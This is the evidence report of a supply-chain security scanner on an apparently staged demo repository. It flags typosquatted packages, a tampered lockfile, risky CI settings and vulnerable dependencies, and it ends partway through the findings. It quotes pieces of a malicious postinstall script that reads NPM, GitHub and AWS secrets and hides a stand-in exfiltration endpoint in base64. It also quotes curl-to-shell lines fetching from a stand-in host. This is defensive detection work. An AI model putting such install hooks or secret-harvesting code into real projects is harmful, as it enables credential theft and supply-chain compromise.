# Guardian evidence report: sscg-demo-target

*Scanned 2026-11-23T12:37:18+00:00 with sscg 0.1.0* · HEAD `8cad42e`

**Repository → SBOM → Dependency graph → Risk detection → Evidence** ✔

## 1. What is in the application

| | |
|---|---|
| Components | 31 (github-actions 3, url 2, docker 1, maven 8, npm 7, pypi 10) |
| Libraries | 25: 13 direct, 12 transitive, max depth 2 |
| Container images | 1: fastbuilds42/node:latest |
| CI/CD | 1 workflow(s), 3 distinct actions |
| SBOM | `sbom.cdx.json` (CycloneDX 1.5, 36 components) |

## 2. What changed

Base `bf0e651` (feat: initial acme-orders service) → HEAD `8cad42e` (chore: routine dependency refresh)

- Author of HEAD: fastbuilds42 <fastbuilds42@users.example.invalid>, first-time contributor: **yes**
- Files changed: M `.github/workflows/ci.yml`, M `Dockerfile`, M `package-lock.json`, M `package.json`, A `scripts/setup.js`, M `worker/requirements.txt`
- Components added: `fastbuilds42/node:latest`, `fastbuilds42/cache-helper@main`, `crossenv@7.0.3`, `python3-dateutil@2.8.1`, `get.example.invalid/bootstrap.sh`, `get.example.invalid/ci-agent.sh`, `urllib3@2.8.0`
- Components removed: `node:18-alpine`
- Components changed: `lodash@4.17.15` → `lodash@4.17.15` (resolved, integrity)
- **New findings introduced by this change: 25**

## 3. What appears risky

**41 findings**: 16 vulnerable components (141 advisories) and 25 supply-chain anomalies.

| Level | Critical | High | Medium | Low | Info |
|---|---|---|---|---|---|
| Findings | 21 | 8 | 12 | 0 | 0 |

*Initial risk = Guardian initial risk (heuristic, 0-10); not a CVSS score. Official severity is shown separately for vulnerabilities.*

| ID | Risk | Type | Finding | Location | New |
|---|---|---|---|---|---|
| F-001 | 🟥 Critical (10.0) | Unsafe install script | 'postinstall' script scripts/setup.js runs shell commands / child processes, reads secrets from the environment, hides data with base64, fingerprints the host / user | `scripts/setup.js:3` | 🆕 |
| F-002 | 🟥 Critical (10.0) | Unsafe CI/CD component | .github/workflows/ci.yml: 'pull_request_target' workflow checks out the pull request's own code | `.github/workflows/ci.yml:16` | 🆕 |
| F-003 | 🟥 Critical (10.0) | Unsafe CI/CD component | .github/workflows/ci.yml: secret(s) NPM_TOKEN are passed to a downloaded script | `.github/workflows/ci.yml:24` | 🆕 |
| F-004 | 🟥 Critical (10.0) | Typosquatted package | crossenv@7.0.3 is a documented malicious package | `package.json:18` | 🆕 |
| F-005 | 🟥 Critical (10.0) | Modified lockfile | lodash@4.17.15: same version, different content hash (and source) in package-lock.json | `package-lock.json:51` | 🆕 |
| F-006 | 🟥 Critical (10.0) | Typosquatted package | python3-dateutil@2.8.1 is a documented malicious package | `worker/requirements.txt:4` | 🆕 |
| F-007 | 🟥 Critical (10.0) | Vulnerable direct dependency | org.apache.logging.log4j:log4j-core@2.14.1: 8 known vulnerabilities (highest CRITICAL, CVSS 10.0) | `notifier/pom.xml` |  |
| F-008 | 🟥 Critical (9.8) | Vulnerable direct dependency | com.fasterxml.jackson.core:jackson-databind@2.9.8: 60 known vulnerabilities (highest CRITICAL, CVSS 9.8) | `notifier/pom.xml` |  |
| F-009 | 🟥 Critical (9.8) | Vulnerable transitive dependency | minimist@0.0.8: 2 known vulnerabilities (highest CRITICAL, CVSS 9.8) | `package-lock.json` |  |
| F-010 | 🟥 Critical (9.8) | Vulnerable direct dependency | org.apache.commons:commons-text@1.9: 1 known vulnerability (highest CRITICAL, CVSS 9.8) | `notifier/pom.xml` |  |
| F-011 | 🟥 Critical (9.8) | Vulnerable direct dependency | pyyaml@5.3.0: 2 known vulnerabilities (highest CRITICAL, CVSS 9.8) | `worker/requirements.txt:2` |  |
| F-012 | 🟥 Critical (9.0) | Typosquatted package | 'crossenv' looks like the popular package 'cross-env' | `package.json:18` | 🆕 |
| F-013 | 🟥 Critical (9.0) | Typosquatted package | 'python3-dateutil' looks like the popular package 'python-dateutil' | `worker/requirements.txt:4` | 🆕 |
| F-014 | 🟥 Critical (9.0) | Unsafe install script | .github/workflows/ci.yml: job 'build' downloads a script and pipes it into a shell | `.github/workflows/ci.yml:22` | 🆕 |
| F-015 | 🟥 Critical (9.0) | Unsafe CI/CD component | .github/workflows/ci.yml: third-party action 'fastbuilds42/cache-helper@main' is not pinned to a commit SHA | `.github/workflows/ci.yml:20` | 🆕 |
| F-016 | 🟥 Critical (9.0) | Unsafe CI/CD component | .github/workflows/ci.yml: workflow token has 'permissions: write-all' | `.github/workflows/ci.yml:8` | 🆕 |
| F-017 | 🟥 Critical (9.0) | Unsafe install script | Dockerfile downloads a script and pipes it into a shell | `Dockerfile:4` | 🆕 |
| F-018 | 🟥 Critical (9.0) | Suspicious package update | first-time contributor fastbuilds42 changed 6 build/dependency files in 8cad42e ("chore: routine dependency refresh") | `commit 8cad42e` | 🆕 |
| F-019 | 🟥 Critical (9.0) | Untrusted image | image fastbuilds42/node:latest is not an official / verified-publisher image (docker.io/fastbuilds42/node) | `Dockerfile:1` | 🆕 |
| F-020 | 🟥 Critical (9.0) | Modified lockfile | lodash@4.17.15 is downloaded from npm-mirror.example.invalid, not the npm registry | `package-lock.json:50` | 🆕 |
| F-021 | 🟥 Critical (9.0) | Modified lockfile | lodash@4.17.15: lockfile entry changed (resolved, integrity) but package.json still asks for '4.17.15' | `package-lock.json:51` | 🆕 |
| F-022 | 🟧 High (8.8) | Vulnerable direct dependency | node-fetch@2.6.0: 2 known vulnerabilities (highest HIGH, CVSS 8.8) | `package-lock.json` |  |
| F-023 | 🟧 High (8.6) | Vulnerable direct dependency | axios@0.21.0: 25 known vulnerabilities (highest HIGH, CVSS 8.6) | `package-lock.json` |  |
| F-024 | 🟧 High (8.6) | Vulnerable direct dependency | jinja2@2.10.0: 6 known vulnerabilities (highest HIGH, CVSS 8.6) | `worker/requirements.txt:3` |  |
| F-025 | 🟧 High (8.1) | Vulnerable direct dependency | lodash@4.17.15: 5 known vulnerabilities (highest HIGH, CVSS 8.1) | `package-lock.json` |  |
| F-026 | 🟧 High (8.0) | Vulnerable transitive dependency | follow-redirects@1.13.0: 5 known vulnerabilities (highest HIGH, CVSS 8.0) | `package-lock.json` |  |
| F-027 | 🟧 High (7.5) | Vulnerable transitive dependency | com.fasterxml.jackson.core:jackson-core@2.9.8: 4 known vulnerabilities (highest HIGH, CVSS 7.5) | `notifier/pom.xml` |  |
| F-028 | 🟧 High (7.5) | Vulnerable direct dependency | requests@2.19.1: 5 known vulnerabilities (highest HIGH, CVSS 7.5) | `worker/requirements.txt:1` |  |
| F-029 | 🟧 High (7.5) | Vulnerable transitive dependency | urllib3@1.23.0: 12 known vulnerabilities (highest HIGH, CVSS 7.5) | `worker/requirements.txt:1` |  |
| F-030 | 🟨 Medium (6.5) | Untrusted image | Dockerfile runs 'npm install' with install scripts enabled | `Dockerfile:5` | 🆕 |
| F-031 | 🟨 Medium (6.5) | Unsafe install script | acme-orders@1.0.0 runs a 'postinstall' script on every install: node scripts/setup.js | `package.json:8` | 🆕 |
| F-032 | 🟨 Medium (6.5) | Untrusted image | image fastbuilds42/node:latest uses a mutable tag and no digest | `Dockerfile:1` | 🆕 |
| F-033 | 🟨 Medium (6.5) | Unexpected dependency | new dev dependency crossenv@7.0.3 added in package.json | `package.json:18` | 🆕 |
| F-034 | 🟨 Medium (6.5) | Unexpected dependency | new prod dependency python3-dateutil@2.8.1 added in worker/requirements.txt | `worker/requirements.txt:4` | 🆕 |
| F-035 | 🟨 Medium (6.5) | Unexpected dependency | new prod dependency urllib3@2.8.0 added in worker/requirements.txt | `worker/requirements.txt:5` | 🆕 |
| F-036 | 🟨 Medium (6.5) | Vulnerable transitive dependency | org.apache.commons:commons-lang3@3.11: 1 known vulnerability (highest MEDIUM, CVSS 6.5) | `notifier/pom.xml` |  |
| F-037 | 🟨 Medium (6.2) | Vulnerable transitive dependency | idna@2.7.0: 2 known vulnerabilities (highest MEDIUM, CVSS 6.2) | `worker/requirements.txt:1` |  |
| F-038 | 🟨 Medium (5.5) | Vulnerable transitive dependency | org.apache.logging.log4j:log4j-api@2.14.1: 1 known vulnerability (highest MEDIUM) | `notifier/pom.xml` |  |
| F-039 | 🟨 Medium (4.0) | Suspicious package update | 'urllib3' has no exact version in worker/requirements.txt (any version) | `worker/requirements.txt:5` | 🆕 |
| F-040 | 🟨 Medium (4.0) | Untrusted image | Dockerfile sets no USER: the container runs as the base image's default user (usually root) | `Dockerfile` | 🆕 |
| F-041 | 🟨 Medium (4.0) | Unsafe install script | crossenv@7.0.3 runs an install script (code not inspected) | `package-lock.json` | 🆕 |

## 4. Evidence per finding

### F-001 · 🟥 Critical (10.0) · Unsafe install script · 🆕 new in this change

- **What:** 'postinstall' script scripts/setup.js runs shell commands / child processes, reads secrets from the environment, hides data with base64, fingerprints the host / user
- **Where:** `scripts/setup.js:3`
- **Evidence:**
  - `scripts/setup.js:3`: `const cp = require('child_process');` (runs shell commands / child processes)
  - `scripts/setup.js:7`: `const KEYS = ['NPM_TOKEN', 'GITHUB_TOKEN', 'AWS_SECRET_ACCESS_KEY'];` (reads secrets from the environment)
  - `scripts/setup.js:6`: `const ENDPOINT = Buffer.from('aHR0cDovL3RlbGVtZXRyeS5leGFtcGxlLmludmFsaWQvYw==', 'base64').toString();` (hides data with base64)
  - `scripts/setup.js:10`: `return { host: os.hostname(), user: os.userInfo().username, keys: KEYS.filter((k) => k in process.env) };` (fingerprints the host / user)
  - base64 string in scripts/setup.js decodes to: http://telemetry.example.invalid/c
- **Initial risk:** Critical (10.0): R04_INSTALL_SCRIPT_CONTENT default level Critical; introduced in the latest change
- **Why it matters:** The install script contains behaviour typical of credential theft or droppers.
- **Basis:** verified fact, confidence high

### F-002 · 🟥 Critical (10.0) · Unsafe CI/CD component · 🆕 new in this change

- **What:** .github/workflows/ci.yml: 'pull_request_target' workflow checks out the pull request's own code
- **Where:** `.github/workflows/ci.yml:16`
- **Evidence:**
  - `.github/workflows/ci.yml:16`: `ref: ${{ github.event.pull_request.head.sha }}`
  - triggers: pull_request_target, push
- **Initial risk:** Critical (10.0): R14_CI_PWN_REQUEST default level Critical; introduced in the latest change
- **Why it matters:** pull_request_target runs with repository secrets; checking out the PR's code runs untrusted code with them.
- **Basis:** verified fact, confidence high

### F-003 · 🟥 Critical (10.0) · Unsafe CI/CD component · 🆕 new in this change

- **What:** .github/workflows/ci.yml: secret(s) NPM_TOKEN are passed to a downloaded script
- **Where:** `.github/workflows/ci.yml:24`
- **Evidence:**
  - `.github/workflows/ci.yml:24`: `NPM_TOKEN: ${{ secrets.NPM_TOKEN }}`
- **Initial risk:** Critical (10.0): R17_CI_SECRET_EXPOSURE default level Critical; introduced in the latest change
- **Why it matters:** A secret is handed to code that was downloaded at run time or comes from a mutable third-party action.
- **Basis:** verified fact, confidence high

### F-004 · 🟥 Critical (10.0) · Typosquatted package · 🆕 new in this change

- **What:** crossenv@7.0.3 is a documented malicious package
- **Component:** `crossenv@7.0.3` (npm, scope dev, direct), purl `pkg:npm/crossenv@7.0.3`
- **Where:** `package.json:18`
- **Dependency path:** acme-orders@1.0.0 → crossenv@7.0.3
- **Evidence:**
  - known_malicious.json: npm typosquatting campaign, Aug 2017: credential-stealing packages published by user 'hacktask', removed by npm (impersonates 'cross-env')
- **Initial risk:** Critical (10.0): R02_KNOWN_MALICIOUS default level Critical; introduced in the latest change
- **Why it matters:** This package (version) is publicly documented as malicious.
- **Basis:** verified fact, confidence high

### F-005 · 🟥 Critical (10.0) · Modified lockfile · 🆕 new in this change

- **What:** lodash@4.17.15: same version, different content hash (and source) in package-lock.json
- **Component:** `lodash@4.17.15` (npm, scope prod, direct), purl `pkg:npm/lodash@4.17.15`
- **Where:** `package-lock.json:51`
- **Dependency path:** acme-orders@1.0.0 → lodash@4.17.15
- **Evidence:**
  - lockfile change in `package-lock.json`: resolved: `https://registry.npmjs.org/lodash/-/lodash-4.17.15.tgz` → `https://npm-mirror.example.invalid/lodash/-/lodash-4.17.15.tgz`; integrity: `sha512-8xOcRHvCjnocdS5cpwXQXVzmmh5e5+saE2QGoeQmbKmRS6J3VQppPOIt0MnmE+4xlZoumy0GPG0D0MVIQbNA1A==` → `sha512-v2kDEe57lecTulaDIuNTPy3Ry4gLGJ6Z1O3vE1krgXZNrsQ+LFTGHVxVjcXPs17LhbZVGedAJv8XZ1tvj5FvSg==`
  - `package-lock.json:51`: `"integrity": "sha512-v2kDEe57lecTulaDIuNTPy3Ry4gLGJ6Z1O3vE1krgXZNrsQ+LFTGHVxVjcXPs17LhbZVGedAJv8XZ1tvj5FvSg=="`
  - commit `8cad42e` by fastbuilds42 <fastbuilds42@users.example.invalid>, 2026-11-23T13:19:53+05:30: "chore: routine dependency refresh"
- **Initial risk:** Critical (10.0): R06_LOCKFILE_INTEGRITY_CHANGED default level Critical; introduced in the latest change
- **Why it matters:** Same name and version but a different content hash: the package tarball was swapped.
- **Basis:** verified fact, confidence high

### F-006 · 🟥 Critical (10.0) · Typosquatted package · 🆕 new in this change

- **What:** python3-dateutil@2.8.1 is a documented malicious package
- **Component:** `python3-dateutil@2.8.1` (pypi, scope prod, direct), purl `pkg:pypi/python3-dateutil@2.8.1`
- **Where:** `worker/requirements.txt:4`
- **Dependency path:** worker → python3-dateutil@2.8.1
- **Evidence:**
  - known_malicious.json: PyPI typosquat, Dec 2019: imported jeIlyfish, which stole SSH/GPG keys (impersonates 'python-dateutil')
- **Initial risk:** Critical (10.0): R02_KNOWN_MALICIOUS default level Critical; introduced in the latest change
- **Why it matters:** This package (version) is publicly documented as malicious.
- **Basis:** verified fact, confidence high

### F-007 · 🟥 Critical (10.0) · Vulnerable direct dependency

- **What:** org.apache.logging.log4j:log4j-core@2.14.1: 8 known vulnerabilities (highest CRITICAL, CVSS 10.0)
- **Component:** `org.apache.logging.log4j:log4j-core@2.14.1` (maven, scope prod, direct), purl `pkg:maven/org.apache.logging.log4j/log4j-core@2.14.1`
- **Where:** `notifier/pom.xml`
- **Dependency path:** com.acme:notifier@1.0.0 → org.apache.logging.log4j:log4j-core@2.14.1
- **Official severity:** CRITICAL, CVSS 10.0 (OSV CVSS v3 vector (score computed))
- **Fix available:** upgrade to ≥ 2.25.4
- **Evidence:**
  - [GHSA-jfh8-c2jp-5v3q](https://osv.dev/vulnerability/GHSA-jfh8-c2jp-5v3q) (CVE-2021-44228): CRITICAL, CVSS 10.0, fixed in 2.15.0. Remote code injection in Log4j
  - [GHSA-7rjr-3q55-vv33](https://osv.dev/vulnerability/GHSA-7rjr-3q55-vv33) (CVE-2021-45046): CRITICAL, CVSS 9.0, fixed in 2.16.0. Incomplete fix for Apache Log4j vulnerability
  - [GHSA-p6xc-xr62-6r2g](https://osv.dev/vulnerability/GHSA-p6xc-xr62-6r2g) (CVE-2021-45105): HIGH, CVSS 8.6, fixed in 2.17.0. Apache Log4j2 vulnerable to Improper Input Validation and Uncontrolled Recursion
  - [GHSA-8489-44mv-ggj8](https://osv.dev/vulnerability/GHSA-8489-44mv-ggj8) (CVE-2021-44832): MEDIUM, CVSS 6.6, fixed in 2.17.1. Improper Input Validation and Injection in Apache Log4j2
  - [GHSA-3pxv-7cmr-fjr4](https://osv.dev/vulnerability/GHSA-3pxv-7cmr-fjr4) (CVE-2026-34480): MEDIUM, fixed in 2.25.4. Apache Log4j Core: Silent log event loss in XmlLayout due to unescaped XML 1.0 forbidden characters
  - [GHSA-6hg6-v5c8-fphq](https://osv.dev/vulnerability/GHSA-6hg6-v5c8-fphq) (CVE-2026-34477): MEDIUM, fixed in 2.25.4. Apache Log4j Core: `verifyHostName` attribute silently ignored in TLS configuration
  - [GHSA-h383-gmxw-35v2](https://osv.dev/vulnerability/GHSA-h383-gmxw-35v2) (CVE-2026-34479): MEDIUM, fixed in 2.25.4. Apache Log4j 1 to Log4j 2 bridge: silent log event loss in Log4j1XmlLayout due to unescaped XML 1.0 forbidden characters
  - [GHSA-vc5p-v9hr-52mj](https://osv.dev/vulnerability/GHSA-vc5p-v9hr-52mj) (CVE-2025-68161): MEDIUM, fixed in 2.25.3. Apache Log4j does not verify the TLS hostname in its Socket Appender
- **Initial risk:** Critical (10.0): highest advisory severity CRITICAL (CVSS 10.0)
- **Why it matters:** Published advisories affect this exact version.
- **Basis:** verified fact, confidence high

### F-008 · 🟥 Critical (9.8) · Vulnerable direct dependency

- **What:** com.fasterxml.jackson.core:jackson-databind@2.9.8: 60 known vulnerabilities (highest CRITICAL, CVSS 9.8)
- **Component:** `com.fasterxml.jackson.core:jackson-databind@2.9.8` (maven, scope prod, direct), purl `pkg:maven/com.fasterxml.jackson.core/jackson-databind@2.9.8`
- **Where:** `notifier/pom.xml`
- **Dependency path:** com.acme:notifier@1.0.0 → com.fasterxml.jackson.core:jackson-databind@2.9.8
- **Official severity:** CRITICAL, CVSS 9.8 (OSV CVSS v3 vector (score computed))
- **Fix available:** upgrade to ≥ 2.18.11
- **Evidence:**
  - [GHSA-4w82-r329-3q67](https://osv.dev/vulnerability/GHSA-4w82-r329-3q67) (CVE-2020-8840): CRITICAL, CVSS 9.8, fixed in 2.9.10.3. Deserialization of Untrusted Data in jackson-databind
  - [GHSA-5p34-5m6p-p58g](https://osv.dev/vulnerability/GHSA-5p34-5m6p-p58g) (CVE-2020-9546): CRITICAL, CVSS 9.8, fixed in 2.9.10.4. jackson-databind mishandles the interaction between serialization gadgets and typing
  - [GHSA-6fpp-rgj9-8rwc](https://osv.dev/vulnerability/GHSA-6fpp-rgj9-8rwc) (CVE-2019-14379): CRITICAL, CVSS 9.8, fixed in 2.9.9.2. Deserialization of untrusted data in FasterXML jackson-databind
  - [GHSA-85cw-hj65-qqv9](https://osv.dev/vulnerability/GHSA-85cw-hj65-qqv9) (CVE-2019-16335): CRITICAL, CVSS 9.8, fixed in 2.9.10. Polymorphic Typing issue in FasterXML jackson-databind
  - [GHSA-f3j5-rmmp-3fc5](https://osv.dev/vulnerability/GHSA-f3j5-rmmp-3fc5) (CVE-2019-17267): CRITICAL, CVSS 9.8, fixed in 2.9.10. Improper Input Validation in jackson-databind
  - [GHSA-fmmc-742q-jg75](https://osv.dev/vulnerability/GHSA-fmmc-742q-jg75) (CVE-2019-16943): CRITICAL, CVSS 9.8, fixed in 2.9.10.1. jackson-databind polymorphic typing issue
  - [GHSA-gjmw-vf9h-g25v](https://osv.dev/vulnerability/GHSA-gjmw-vf9h-g25v) (CVE-2019-17531): CRITICAL, CVSS 9.8, fixed in 2.9.10.1. jackson-databind polymorphic typing issue
  - [GHSA-gww7-p5w4-wrfv](https://osv.dev/vulnerability/GHSA-gww7-p5w4-wrfv) (CVE-2019-20330): CRITICAL, CVSS 9.8, fixed in 2.9.10.2. Deserialization of Untrusted Data in jackson-databind
  - [GHSA-h822-r4r5-v8jg](https://osv.dev/vulnerability/GHSA-h822-r4r5-v8jg) (CVE-2019-14540): CRITICAL, CVSS 9.8, fixed in 2.9.10. Polymorphic Typing issue in FasterXML jackson-databind
  - [GHSA-mx7p-6679-8g3q](https://osv.dev/vulnerability/GHSA-mx7p-6679-8g3q) (CVE-2019-16942): CRITICAL, CVSS 9.8, fixed in 2.9.10.1. Polymorphic Typing in FasterXML jackson-databind
  - [GHSA-p43x-xfjf-5jhr](https://osv.dev/vulnerability/GHSA-p43x-xfjf-5jhr) (CVE-2020-9548): CRITICAL, CVSS 9.8, fixed in 2.9.10.4. jackson-databind mishandles the interaction between serialization gadgets and typing
  - [GHSA-q93h-jc49-78gg](https://osv.dev/vulnerability/GHSA-q93h-jc49-78gg) (CVE-2020-9547): CRITICAL, CVSS 9.8, fixed in 2.9.10.4. jackson-databind mishandles the interaction between serialization gadgets and typing
  - … 48 more in findings.json
- **Initial risk:** Critical (9.8): highest advisory severity CRITICAL (CVSS 9.8)
- **Why it matters:** Published advisories affect this exact version.
- **Basis:** verified fact, confidence high

### F-009 · 🟥 Critical (9.8) · Vulnerable transitive dependency

- **What:** minimist@0.0.8: 2 known vulnerabilities (highest CRITICAL, CVSS 9.8)
- **Component:** `minimist@0.0.8` (npm, scope prod, transitive), purl `pkg:npm/minimist@0.0.8`
- **Where:** `package-lock.json`
- **Dependency path:** acme-orders@1.0.0 → mkdirp@0.5.1 → minimist@0.0.8
- **Official severity:** CRITICAL, CVSS 9.8 (OSV CVSS v3 vector (score computed))
- **Fix available:** upgrade to ≥ 0.2.4
- **Evidence:**
  - [GHSA-xvch-5gv4-984h](https://osv.dev/vulnerability/GHSA-xvch-5gv4-984h) (CVE-2021-44906): CRITICAL, CVSS 9.8, fixed in 0.2.4. Prototype Pollution in minimist
  - [GHSA-vh95-rmgr-6w4m](https://osv.dev/vulnerability/GHSA-vh95-rmgr-6w4m) (CVE-2020-7598): MEDIUM, CVSS 5.6, fixed in 0.2.1. Prototype Pollution in minimist
- **Initial risk:** Critical (9.8): highest advisory severity CRITICAL (CVSS 9.8)
- **Why it matters:** Published advisories affect this exact version.
- **Basis:** verified fact, confidence high

### F-010 · 🟥 Critical (9.8) · Vulnerable direct dependency

- **What:** org.apache.commons:commons-text@1.9: 1 known vulnerability (highest CRITICAL, CVSS 9.8)
- **Component:** `org.apache.commons:commons-text@1.9` (maven, scope prod, direct), purl `pkg:maven/org.apache.commons/commons-text@1.9`
- **Where:** `notifier/pom.xml`
- **Dependency path:** com.acme:notifier@1.0.0 → org.apache.commons:commons-text@1.9
- **Official severity:** CRITICAL, CVSS 9.8 (OSV CVSS v3 vector (score computed))
- **Fix available:** upgrade to ≥ 1.10.0
- **Evidence:**
  - [GHSA-599f-7c49-w659](https://osv.dev/vulnerability/GHSA-599f-7c49-w659) (CVE-2022-42889): CRITICAL, CVSS 9.8, fixed in 1.10.0. Arbitrary code execution in Apache Commons Text
- **Initial risk:** Critical (9.8): highest advisory severity CRITICAL (CVSS 9.8)
- **Why it matters:** Published advisories affect this exact version.
- **Basis:** verified fact, confidence high

### F-011 · 🟥 Critical (9.8) · Vulnerable direct dependency

- **What:** pyyaml@5.3.0: 2 known vulnerabilities (highest CRITICAL, CVSS 9.8)
- **Component:** `pyyaml@5.3.0` (pypi, scope prod, direct), purl `pkg:pypi/pyyaml@5.3.0`
- **Where:** `worker/requirements.txt:2`
- **Dependency path:** worker → pyyaml@5.3.0
- **Official severity:** CRITICAL, CVSS 9.8 (OSV CVSS v3 vector (score computed))
- **Fix available:** upgrade to ≥ 5.4
- **Evidence:**
  - [GHSA-6757-jp84-gxfx](https://osv.dev/vulnerability/GHSA-6757-jp84-gxfx) (CVE-2020-1747): CRITICAL, CVSS 9.8, fixed in 5.3.1. Improper Input Validation in PyYAML
  - [GHSA-8q59-q68h-6hv4](https://osv.dev/vulnerability/GHSA-8q59-q68h-6hv4) (CVE-2020-14343): CRITICAL, CVSS 9.8, fixed in 5.4. Improper Input Validation in PyYAML
- **Initial risk:** Critical (9.8): highest advisory severity CRITICAL (CVSS 9.8)
- **Why it matters:** Published advisories affect this exact version.
- **Basis:** verified fact, confidence high

### F-012 · 🟥 Critical (9.0) · Typosquatted package · 🆕 new in this change

- **What:** 'crossenv' looks like the popular package 'cross-env'
- **Component:** `crossenv@7.0.3` (npm, scope dev, direct), purl `pkg:npm/crossenv@7.0.3`
- **Where:** `package.json:18`
- **Dependency path:** acme-orders@1.0.0 → crossenv@7.0.3
- **Evidence:**
  - `package.json:18`: `"crossenv": "7.0.3"`
  - popular_npm.txt: 'crossenv' is identical once separators and 'python-/node-' prefixes are removed from 'cross-env'
- **Initial risk:** Critical (9.0): R01_TYPOSQUAT default level High; introduced in the latest change
- **Why it matters:** A name that imitates a popular package is a common way to get malicious code installed by mistake.
- **Basis:** heuristic, confidence high

### F-013 · 🟥 Critical (9.0) · Typosquatted package · 🆕 new in this change

- **What:** 'python3-dateutil' looks like the popular package 'python-dateutil'
- **Component:** `python3-dateutil@2.8.1` (pypi, scope prod, direct), purl `pkg:pypi/python3-dateutil@2.8.1`
- **Where:** `worker/requirements.txt:4`
- **Dependency path:** worker → python3-dateutil@2.8.1
- **Evidence:**
  - `worker/requirements.txt:4`: `python3-dateutil==2.8.1`
  - popular_pypi.txt: 'python3-dateutil' is identical once separators and 'python-/node-' prefixes are removed from 'python-dateutil'
- **Initial risk:** Critical (9.0): R01_TYPOSQUAT default level High; introduced in the latest change
- **Why it matters:** A name that imitates a popular package is a common way to get malicious code installed by mistake.
- **Basis:** heuristic, confidence high

### F-014 · 🟥 Critical (9.0) · Unsafe install script · 🆕 new in this change

- **What:** .github/workflows/ci.yml: job 'build' downloads a script and pipes it into a shell
- **Where:** `.github/workflows/ci.yml:22`
- **Evidence:**
  - `.github/workflows/ci.yml:22`: `- run: curl -fsSL http://get.example.invalid/ci-agent.sh | bash`
- **Initial risk:** Critical (9.0): R12_REMOTE_SCRIPT_EXEC default level High; introduced in the latest change
- **Why it matters:** A script is downloaded and executed without any integrity check.
- **Basis:** verified fact, confidence high

### F-015 · 🟥 Critical (9.0) · Unsafe CI/CD component · 🆕 new in this change

- **What:** .github/workflows/ci.yml: third-party action 'fastbuilds42/cache-helper@main' is not pinned to a commit SHA
- **Component:** `fastbuilds42/cache-helper@main` (github-actions, scope ci, direct), purl `pkg:github/fastbuilds42/cache-helper@main`
- **Where:** `.github/workflows/ci.yml:20`
- **Dependency path:** ci → fastbuilds42/cache-helper@main
- **Evidence:**
  - `.github/workflows/ci.yml:20`: `- uses: fastbuilds42/cache-helper@main`
- **Initial risk:** Critical (9.0): R15_CI_UNPINNED_ACTION default level High; introduced in the latest change
- **Why it matters:** A third-party action referenced by tag/branch can be changed by its owner at any time.
- **Basis:** verified fact, confidence high

### F-016 · 🟥 Critical (9.0) · Unsafe CI/CD component · 🆕 new in this change

- **What:** .github/workflows/ci.yml: workflow token has 'permissions: write-all'
- **Where:** `.github/workflows/ci.yml:8`
- **Evidence:**
  - `.github/workflows/ci.yml:8`: `permissions: write-all`
- **Initial risk:** Critical (9.0): R16_CI_EXCESSIVE_PERMISSIONS default level High; introduced in the latest change
- **Why it matters:** The workflow token can write to the repository, so any compromised step can too.
- **Basis:** verified fact, confidence high

### F-017 · 🟥 Critical (9.0) · Unsafe install script · 🆕 new in this change

- **What:** Dockerfile downloads a script and pipes it into a shell
- **Where:** `Dockerfile:4`
- **Evidence:**
  - `Dockerfile:4`: `RUN curl -fsSL http://get.example.invalid/bootstrap.sh | sh`
- **Initial risk:** Critical (9.0): R12_REMOTE_SCRIPT_EXEC default level High; introduced in the latest change
- **Why it matters:** A script is downloaded and executed without any integrity check.
- **Basis:** verified fact, confidence high

### F-018 · 🟥 Critical (9.0) · Suspicious package update · 🆕 new in this change

- **What:** first-time contributor fastbuilds42 changed 6 build/dependency files in 8cad42e ("chore: routine dependency refresh")
- **Where:** `commit 8cad42e`
- **Evidence:**
  - commit `8cad42e` by fastbuilds42 <fastbuilds42@users.example.invalid> (first-time contributor), 2026-11-23T13:19:53+05:30: "chore: routine dependency refresh"
  - changed: M .github/workflows/ci.yml, M Dockerfile, M package-lock.json, M package.json, A scripts/setup.js, M worker/requirements.txt
- **Initial risk:** Critical (9.0): R18_NEW_AUTHOR_SENSITIVE_CHANGE default level High; introduced in the latest change
- **Why it matters:** A first-time contributor changed files that control what gets built and installed.
- **Basis:** verified fact, confidence high

### F-019 · 🟥 Critical (9.0) · Untrusted image · 🆕 new in this change

- **What:** image fastbuilds42/node:latest is not an official / verified-publisher image (docker.io/fastbuilds42/node)
- **Component:** `fastbuilds42/node:latest` (docker, scope prod, direct), purl `pkg:docker/fastbuilds42/node@latest?repository_url=docker.io`
- **Where:** `Dockerfile:1`
- **Dependency path:** Dockerfile → fastbuilds42/node:latest
- **Evidence:**
  - `Dockerfile:1`: `FROM docker.io/fastbuilds42/node:latest`
- **Initial risk:** Critical (9.0): R10_UNTRUSTED_BASE_IMAGE default level High; introduced in the latest change
- **Why it matters:** The image is not an official or verified-publisher image.
- **Basis:** heuristic, confidence high

### F-020 · 🟥 Critical (9.0) · Modified lockfile · 🆕 new in this change

- **What:** lodash@4.17.15 is downloaded from npm-mirror.example.invalid, not the npm registry
- **Component:** `lodash@4.17.15` (npm, scope prod, direct), purl `pkg:npm/lodash@4.17.15`
- **Where:** `package-lock.json:50`
- **Dependency path:** acme-orders@1.0.0 → lodash@4.17.15
- **Evidence:**
  - `package-lock.json:50`: `"resolved": "https://npm-mirror.example.invalid/lodash/-/lodash-4.17.15.tgz",`
- **Initial risk:** Critical (9.0): R05_LOCKFILE_UNTRUSTED_SOURCE default level High; introduced in the latest change
- **Why it matters:** The package is downloaded from a host other than the official registry.
- **Basis:** verified fact, confidence high

### F-021 · 🟥 Critical (9.0) · Modified lockfile · 🆕 new in this change

- **What:** lodash@4.17.15: lockfile entry changed (resolved, integrity) but package.json still asks for '4.17.15'
- **Component:** `lodash@4.17.15` (npm, scope prod, direct), purl `pkg:npm/lodash@4.17.15`
- **Where:** `package-lock.json:51`
- **Dependency path:** acme-orders@1.0.0 → lodash@4.17.15
- **Evidence:**
  - package.json: "lodash": "4.17.15" in both bf0e651 and 8cad42e
  - lockfile change in `package-lock.json`: resolved: `https://registry.npmjs.org/lodash/-/lodash-4.17.15.tgz` → `https://npm-mirror.example.invalid/lodash/-/lodash-4.17.15.tgz`; integrity: `sha512-8xOcRHvCjnocdS5cpwXQXVzmmh5e5+saE2QGoeQmbKmRS6J3VQppPOIt0MnmE+4xlZoumy0GPG0D0MVIQbNA1A==` → `sha512-v2kDEe57lecTulaDIuNTPy3Ry4gLGJ6Z1O3vE1krgXZNrsQ+LFTGHVxVjcXPs17LhbZVGedAJv8XZ1tvj5FvSg==`
  - commit `8cad42e` by fastbuilds42 <fastbuilds42@users.example.invalid>, 2026-11-23T13:19:53+05:30: "chore: routine dependency refresh"
- **Initial risk:** Critical (9.0): R07_LOCKFILE_DRIFT default level High; introduced in the latest change
- **Why it matters:** The lockfile entry changed although the manifest did not ask for a change.
